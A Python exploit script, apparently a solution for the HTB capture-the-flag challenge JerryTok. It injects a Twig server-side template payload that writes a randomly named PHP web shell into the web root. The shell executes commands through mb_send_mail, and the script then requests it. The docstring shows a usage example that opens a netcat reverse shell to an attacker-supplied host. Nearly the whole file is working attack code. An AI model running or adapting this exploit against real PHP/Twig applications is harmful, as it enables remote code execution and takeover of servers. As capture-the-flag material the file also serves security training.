"""
    Exploit execution sample: 
    python3 mb_send_mail_xpl.py --url http://94.237.63.93:33789 --command "nc <rev_shell_ip> <rev_shell_port> -e /bin/sh" 
"""
import requests
import argparse
import string
import random

def exploit_ssti(payload):
    ssti_url = url + "?location={}"
    return requests.get(
        ssti_url.format(payload ),
        proxies={
            # 'http': 'http://127.0.0.1:8080',
            # 'https': 'https://127.0.0.1:8080',
        }
    )

def generate_shell_name():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + '.php'

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                    prog='mb_send_mail_xpl',
                    description='Exploit solution for HTB challenge JerryTok',
                    epilog='')
    parser.add_argument('-u', '--url', default='http://127.0.0.1:1337', help='Target URL.')
    parser.add_argument('-c','--command', default='id', help='Command to execute on target.')
    args = parser.parse_args()
    url = args.url
    command = args.command
    shell_name = generate_shell_name()

    #### Step 1: Write PHP Shell
    php_backdoor = "<?php mb_send_mail('', '', '', '', '-H \\\"%s\\\"');" % command
    payload = "{{['/www/public/%s',\"%s\"]|sort('file_put_contents')}}" % (shell_name, php_backdoor)
    exploit_ssti(payload)

    #### Step 2: Execute exploit
    response = requests.get("%s/%s" % (url, shell_name))